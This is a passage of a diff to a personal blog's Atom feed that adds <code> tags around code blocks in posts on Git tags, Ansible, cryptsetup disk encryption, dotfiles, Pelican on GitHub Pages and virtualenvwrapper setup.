     &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;mock&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;patch&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;mock_open&lt;/span&gt;
 &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="ne"&gt;ImportError&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
     &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;unittest.mock&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;patch&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;mock_open&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;And finally, all green!&lt;/p&gt;
@@ -545,7 +581,7 @@ ssb   4096R/&lt;span class="o"&gt;[&lt;/span&gt;Subkey ID&lt;span class="o"&gt;]
 &lt;p&gt;Github interface it is certainly nice, but it comes to the price of making your release workflow dependent on Github. What if a certain point you decide that you want to move your code away from Github? Also wouldn't be awesome if you could take care of your releases directly from your trusted terminal? Well, it turns out that you can, since what Github does behind the scene is to create and set a Git tag on the repository.&lt;/p&gt;
 &lt;p&gt;Tags in Git are a way to set a reference to a specific point in history. You can think of them as a way to &lt;em&gt;bookmark&lt;/em&gt; a specific commit. So when you download the source code for your-awesome-project.v1.1.0 you're basically saying "Hey Git, fetch me the code up to the point that correspond to the commit tagged with the name your-awesome-project.v1.1.0".&lt;/p&gt;
 &lt;p&gt;You can set a tag with the &lt;code&gt;git tag&lt;/code&gt; command. However, before you go git-tagging all the things, you should probably be aware that there are two kinds of tags in Git: annotated and lightweight. As the man page for &lt;code&gt;git-tag&lt;/code&gt; explains:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Tag&lt;/span&gt; &lt;span class="n"&gt;objects&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;created&lt;/span&gt; &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;or&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;u&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;are&lt;/span&gt; &lt;span class="k"&gt;called&lt;/span&gt; &lt;span class="ss"&gt;&amp;quot;annotated&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;tags&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;Tag&lt;/span&gt; &lt;span class="n"&gt;objects&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;created&lt;/span&gt; &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;or&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;u&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;are&lt;/span&gt; &lt;span class="k"&gt;called&lt;/span&gt; &lt;span class="ss"&gt;&amp;quot;annotated&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;tags&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 &lt;span class="n"&gt;they&lt;/span&gt; &lt;span class="n"&gt;contain&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;creation&lt;/span&gt; &lt;span class="nb"&gt;date&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;tagger&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="k"&gt;and&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;mail&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;tagging&lt;/span&gt;
 &lt;span class="n"&gt;message&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;and&lt;/span&gt; &lt;span class="n"&gt;an&lt;/span&gt; &lt;span class="n"&gt;optional&lt;/span&gt; &lt;span class="n"&gt;GnuPG&lt;/span&gt; &lt;span class="n"&gt;signature&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="n"&gt;Whereas&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="ss"&gt;&amp;quot;lightweight&amp;quot;&lt;/span&gt; &lt;span class="n"&gt;tag&lt;/span&gt;
 &lt;span class="k"&gt;is&lt;/span&gt; &lt;span class="n"&gt;simply&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;an&lt;/span&gt; &lt;span class="k"&gt;object&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;usually&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="k"&gt;commit&lt;/span&gt; &lt;span class="k"&gt;object&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
@@ -554,14 +590,14 @@ ssb   4096R/&lt;span class="o"&gt;[&lt;/span&gt;Subkey ID&lt;span class="o"&gt;]
 &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;private&lt;/span&gt; &lt;span class="k"&gt;or&lt;/span&gt; &lt;span class="k"&gt;temporary&lt;/span&gt; &lt;span class="k"&gt;object&lt;/span&gt; &lt;span class="n"&gt;labels&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="k"&gt;For&lt;/span&gt; &lt;span class="n"&gt;this&lt;/span&gt; &lt;span class="n"&gt;reason&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;some&lt;/span&gt; &lt;span class="n"&gt;git&lt;/span&gt;
 &lt;span class="n"&gt;commands&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;naming&lt;/span&gt; &lt;span class="n"&gt;objects&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;like&lt;/span&gt; &lt;span class="n"&gt;git&lt;/span&gt; &lt;span class="k"&gt;describe&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;will&lt;/span&gt; &lt;span class="k"&gt;ignore&lt;/span&gt; &lt;span class="n"&gt;lightweight&lt;/span&gt;
 &lt;span class="n"&gt;tags&lt;/span&gt; &lt;span class="k"&gt;by&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;To be honest, I still haven't yet figured out a good case for lightweight tags - if you have, give me a shout 'cause I'd love to know! Anyways, the bottom line is: &lt;strong&gt;do not forget the &lt;code&gt;-a&lt;/code&gt; flag when you're trying to make a release&lt;/strong&gt;.&lt;/p&gt;
 &lt;p&gt;Ok, back to our release!&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ git tag -a v1.0.0 -m &lt;span class="s2"&gt;&amp;quot;My awesome message for v1.0.0&amp;quot;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ git tag -a v1.0.0 -m &lt;span class="s2"&gt;&amp;quot;My awesome message for v1.0.0&amp;quot;&lt;/span&gt;
 $ git push --tags  &lt;span class="c1"&gt;# tags need to be pushed explicitly&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Done!&lt;/p&gt;
@@ -593,10 +629,10 @@ $ git push --tags  &lt;span class="c1"&gt;# tags need to be pushed explicitly&lt
 &lt;p&gt;Finally, you have to &lt;em&gt;echo all the things&lt;/em&gt; in order to keep track of the different installation steps - reducing thus the readability of the script.&lt;/p&gt;
 &lt;p&gt;Of course these are trivial problems and I've happily coped with them for quite some time. But then I had the chance to have a look at Ansible - and it has been a game changer!&lt;/p&gt;
 &lt;p&gt;Ansible uses yaml as a language for its orchestration files (aka playbook), which makes them extremely easy to read. For example, this is how a task for installing Git could look&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="nt"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Install git&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="nt"&gt;name&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Install git&lt;/span&gt;
   &lt;span class="nt"&gt;sudo&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;yes&lt;/span&gt;
   &lt;span class="nt"&gt;apt&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;pkg=git state=latest&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Pretty easy to figure out what it does! On top of that, Ansible outputs the name of your tasks when running them, making it trivial for you to keep track of what's going on behind the scenes.&lt;/p&gt;
@@ -635,8 +671,8 @@ $ git push --tags  &lt;span class="c1"&gt;# tags need to be pushed explicitly&lt
 &lt;/ul&gt;</content><category term="cryptography"></category><category term="GPG"></category><category term="cryptography"></category></entry><entry><title>How to encrypt a removable disk in Ubuntu 14.04</title><link href="https://railslide.io/encrypt-removable-disk-ubuntu-1404.html" rel="alternate"></link><published>2015-04-27T00:00:00+02:00</published><updated>2015-04-27T00:00:00+02:00</updated><author><name>Giulia Vergottini</name></author><id>tag:railslide.io,2015-04-27:/encrypt-removable-disk-ubuntu-1404.html</id><summary type="html">&lt;p&gt;Most of the guides on how to encrypt a removable disk in Ubuntu still refer to Ubuntu 12.04. Here's how to do it in Ubuntu 14.04 and to cope with the changes it introduces to the disks manager tool.&lt;/p&gt;</summary><content type="html">&lt;p&gt;The other day, while encrypting a USB stick, I discovered that most of the available howtos (including the community wiki) refers to Ubuntu 12.04. So, here's how to do it in Ubuntu 14.04, taking into account the changes that the latest LTS introduced to the disks manager tool.&lt;/p&gt;
 &lt;h2&gt;1. Install cryptsetup&lt;/h2&gt;
 &lt;p&gt;The first thing you need to do is to install &lt;code&gt;cryptsetup&lt;/code&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo apt-get install cryptsetup
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sudo apt-get install cryptsetup
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;You can also install it from the Software center if you feel more comfortable with a graphical interface.&lt;/p&gt;
@@ -683,12 +719,12 @@ $ git push --tags  &lt;span class="c1"&gt;# tags need to be pushed explicitly&lt
 &lt;p&gt;Michael Smalley wrote an &lt;a href="http://blog.smalleycreative.com/tutorials/using-git-and-github-to-manage-your-dotfiles/"&gt;amazing tutorial&lt;/a&gt; for managing dotfiles and creating a script for automagically installing them (go and check it out!), which provided me with a great starting point. However, his script handles only dotfiles housed in the home directory and that didn't really get together with my goal of adding Sublime Text settings to my dotfiles repo. So I fired up Nano and extended the script in order to make it do exactly what I needed.&lt;/p&gt;
 &lt;p&gt;First of all, I needed to to move Sublime configuration files to my dotfiles folder. Thankfully &lt;a href="http://zanshin.net/2013/01/21/sublime-text-2-dotfiles-simplified/"&gt;Mark Nichols' post&lt;/a&gt; tipped me that I the only folder I needed to care about was the User one. So, after cleaning it up from some experiments leftovers, I moved to my dotfiles folder and placed a symlink in its previous location.&lt;/p&gt;
 &lt;p&gt;Then I added a variable holding the path to the User directory:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nv"&gt;sublimedir&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;~/.config/sublime-text-3/Packages/User
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;sublimedir&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;~/.config/sublime-text-3/Packages/User
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;and at the end of the file the lines taking care of the magic:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# move any existing dotfiles in homedir to dotfiles_old directory, then create symlinks&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# move any existing dotfiles in homedir to dotfiles_old directory, then create symlinks&lt;/span&gt;
 &lt;span class="k"&gt;for&lt;/span&gt; file in &lt;span class="nv"&gt;$files&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
     &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; -a ~/.&lt;span class="nv"&gt;$file&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;    &lt;span class="c1"&gt;# check if a dotfile already exists&lt;/span&gt;
         &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Moving any existing dotfiles from ~ to &lt;/span&gt;&lt;span class="nv"&gt;$olddir&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
@@ -716,7 +752,7 @@ $ git push --tags  &lt;span class="c1"&gt;# tags need to be pushed explicitly&lt
 &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Creating symlink to User in &lt;/span&gt;&lt;span class="nv"&gt;$sublimedir&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
 ln -s &lt;span class="nv"&gt;$dir&lt;/span&gt;/sublime/User &lt;span class="nv"&gt;$sublimedir&lt;/span&gt;
 &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;...done&amp;quot;&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;The full script can be found on &lt;a href="https://github.com/Railslide/dotfiles/blob/master/installdotfiles.sh"&gt;github&lt;/a&gt;.&lt;/p&gt;
@@ -726,63 +762,63 @@ ln -s &lt;span class="nv"&gt;$dir&lt;/span&gt;/sublime/User &lt;span class="nv"&
 &lt;p&gt;GitHub offers the possibility to host your site in the cloud through either &lt;a href="https://help.github.com/articles/user-organization-and-project-pages"&gt;personal or project pages&lt;/a&gt;. Although it is possible to use both for hosting a Pelican powered blog, project pages make your life so much easier when it comes both to publish your blog content and to put blog source under revision control.&lt;/p&gt;
 &lt;p&gt;For creating project pages, all we need to do is to create a repository as usual and put the content we wish to publish (i.e. the HTML static files) into a branch named &lt;code&gt;gh-pages&lt;/code&gt;. Once done that, your page will show up at username.github.io/repository.&lt;/p&gt;
 &lt;p&gt;Although it could sounds overly complicated - especially the &lt;code&gt;gh-pages&lt;/code&gt; branch part - you don't have to worry since an awesome program called &lt;a href="https://github.com/davisp/ghp-import"&gt;ghp-import&lt;/a&gt; will take care of it for us. For now, simply create a new repository as you would do for any other project and set up a &lt;code&gt;.gitignore&lt;/code&gt; file with the following content:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;*.pid&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;*.pid&lt;/span&gt;
 &lt;span class="err"&gt;*.pyc&lt;/span&gt;
 &lt;span class="err"&gt;output/&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h1&gt;2. Installing the needed packages&lt;/h1&gt;
 &lt;p&gt;Before installing Pelican, I would recommend to create a new virtualenv. It is not mandatory, but it is definitely a good practice and would prevent the risk of conflicts between installed packages.&lt;/p&gt;
 &lt;p&gt;NOTE: Pelican documentation recommends to use Pelican with Python 2.7. I am keeping up with &lt;a href="https://railslide.io/virtualenvwrapper-python3.html"&gt;my pledge of using Python 3 whenever possible&lt;/a&gt;, as well as giving a try with Python 3.4 (Ubuntu 14.04 default version). Everything works fine so far and anyways these instructions are version agnostic - just be aware of it and choose your Python version accordingly.&lt;/p&gt;
 &lt;p&gt;Install pelican and ghp-import&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;pip install pelican
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;pip install pelican
 pip install -e git+git://github.com/davisp/ghp-import.git#egg&lt;span class="o"&gt;=&lt;/span&gt;ghp-import
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Next run &lt;code&gt;pelican-quickstart&lt;/code&gt; and get ready to answer to a bunch of questions. Most of them are pretty straightforward and anyway you'll be able to change them later in your settings files. These are the only ones you need to care about for the moment:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Where &lt;span class="k"&gt;do&lt;/span&gt; you want to create your new web site? &lt;span class="o"&gt;[&lt;/span&gt;.&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;# Press enter&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Where &lt;span class="k"&gt;do&lt;/span&gt; you want to create your new web site? &lt;span class="o"&gt;[&lt;/span&gt;.&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;# Press enter&lt;/span&gt;
 Do you want to specify a URL prefix? e.g., http://example.com &lt;span class="o"&gt;(&lt;/span&gt;Y/n&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# y&lt;/span&gt;
 What is your URL prefix? &lt;span class="o"&gt;(&lt;/span&gt;see above example&lt;span class="p"&gt;;&lt;/span&gt; no trailing slash&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# http://username.github.io/repository&lt;/span&gt;
 Do you want to generate a Fabfile/Makefile to automate generation and publishing? &lt;span class="o"&gt;(&lt;/span&gt;Y/n&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# y&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Answer &lt;code&gt;n&lt;/code&gt; to all the questions about uploading your website and you are ready to go.&lt;/p&gt;
 &lt;h1&gt;3. Writing content&lt;/h1&gt;
 &lt;p&gt;Fire up your favorite text editor and write your blog content in either Markdown or reStructuredText. Once you have done, save it in the content folder. For previewing it:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;make devserver
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;make devserver
 &lt;span class="c1"&gt;# go to http://localhost:8000 and check if everything looks good&lt;/span&gt;
 ^C &lt;span class="c1"&gt;# note that CTRL+C won&amp;#39;t stop dev server&lt;/span&gt;
 ./develop_server.sh stop &lt;span class="c1"&gt;# manually stop the dev server&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h1&gt;4. Publishing and pushing&lt;/h1&gt;
 &lt;p&gt;Ok this is the easy part.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# pushing the source repo&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# pushing the source repo&lt;/span&gt;
 git push origin master
 
 &lt;span class="c1"&gt;# push the output folder to GitHub pages&lt;/span&gt;
 make github
 
 &lt;span class="c1"&gt;# celebrate!&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Congrats! Your blog is now up and running!&lt;/p&gt;
 &lt;h1&gt;5. Setting up your custom domain&lt;/h1&gt;
 &lt;p&gt;Create a CNAME file containing your bare domain:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;mydomain.com&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;mydomain.com&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Add the following lines to your pelicanconf.py, in order to make Pelican copying it to your output folder on every publish.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;STATIC_PATHS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;STATIC_PATHS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
 &lt;span class="s1"&gt;&amp;#39;CNAME&amp;#39;&lt;/span&gt;
 &lt;span class="p"&gt;]&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Then, assuming that you want both mydomain.com and www.mydomain.com to point at your blog, you need to set &lt;strong&gt;both the CNAME and the A-records&lt;/strong&gt; of your domain to point at github.&lt;/p&gt;
@@ -795,10 +831,10 @@ make github
 &lt;li&gt;&lt;a href="http://stackoverflow.com/a/22374542/2926113"&gt;This answer&lt;/a&gt; from Stack Overflow provides great step-by-step instructions for using GitHub project pages with a custom domain&lt;/li&gt;
 &lt;/ol&gt;
 &lt;p&gt;Here are the lines taking care of the magic in my case:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;www 10800 IN CNAME railslide.github.io.&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;www 10800 IN CNAME railslide.github.io.&lt;/span&gt;
 &lt;span class="err"&gt;@ 10800 IN A 192.30.252.153&lt;/span&gt;
 &lt;span class="err"&gt;@ 10800 IN A 192.30.252.154&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;After that, wait some hours for the DNS to propagate and you should be done.&lt;/p&gt;</content><category term="pelican"></category><category term="pelican"></category><category term="publishing"></category><category term="github pages"></category></entry><entry><title>Installing virtualenvwrapper for Python 3.4 on Ubuntu</title><link href="https://railslide.io/virtualenvwrapper-python3.html" rel="alternate"></link><published>2014-06-04T00:00:00+02:00</published><updated>2014-06-04T00:00:00+02:00</updated><author><name>Giulia Vergottini</name></author><id>tag:railslide.io,2014-06-04:/virtualenvwrapper-python3.html</id><summary type="html">&lt;p&gt;Virtualenvwrapper is a great virtualenv management tool. Here is how I set it up for Python 3.4 on Ubuntu.&lt;/p&gt;</summary><content type="html">&lt;p&gt;After listening to an inspiring talk by &lt;a href="http://www.kennethreitz.org/"&gt;Kenneth Reitz&lt;/a&gt; about transitioning from Python 2 to Python 3 at PyCon Sweden (I'll write a blog post about it sooner or later), I've decided that I should try to stick to Python 3 as much as possible.&lt;/p&gt;
@@ -806,33 +842,33 @@ make github
 &lt;p&gt;Virtualenwrapper documentation specifies that Virtualenvwrapper has been tested under Python 2.6-3.3, but no mention of Python 3.4. Being lazy and not really willing to install a third version of Python on my computer (Ubuntu 14.04 comes with Python 2.7.6 and Python 3.4 by default), I decided to give it try with what I had. Everything seems to work flawlessly so far, just keep it in mind in case you want to try to follow these instructions.&lt;/p&gt;
 &lt;h2&gt;Setting up Virtualenvwrapper&lt;/h2&gt;
 &lt;p&gt;Install pip for Python 3:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo apt-get install python3-pip
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sudo apt-get install python3-pip
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Install Virtualenvwrapper for Python 3:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo pip3 install virtualenvwrapper
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sudo pip3 install virtualenvwrapper
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;So far so good. Now it is time to configure Virtualenvwrapper.&lt;/p&gt;
 &lt;p&gt;Create a folder for your virtualenvs (I use ~/.virtualenvs) and set it as WORKON_HOME:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mkdir ~/.virtualenvs
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;mkdir ~/.virtualenvs
 &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;WORKON_HOME&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;~/.virtualenvs
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Add the following lines to ~/.bashrc:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;VIRTUALENVWRAPPER_PYTHON=&amp;#39;/usr/bin/python3&amp;#39; # This needs to be placed before the virtualenvwrapper command&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;VIRTUALENVWRAPPER_PYTHON=&amp;#39;/usr/bin/python3&amp;#39; # This needs to be placed before the virtualenvwrapper command&lt;/span&gt;
 &lt;span class="err"&gt;source /usr/local/bin/virtualenvwrapper.sh&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Close and re-open your shell and you're ready to go. Here are the basic commands for using virtualenvwrapper:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mkvirtualenv virtualenv_name &lt;span class="c1"&gt;# Create virtualenv&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;mkvirtualenv virtualenv_name &lt;span class="c1"&gt;# Create virtualenv&lt;/span&gt;
 workon virtualenv_name &lt;span class="c1"&gt;# Activate/switch to a virtualenv&lt;/span&gt;
 deactivate virtualenv_name &lt;span class="c1"&gt;# Deactivate virtualenv&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
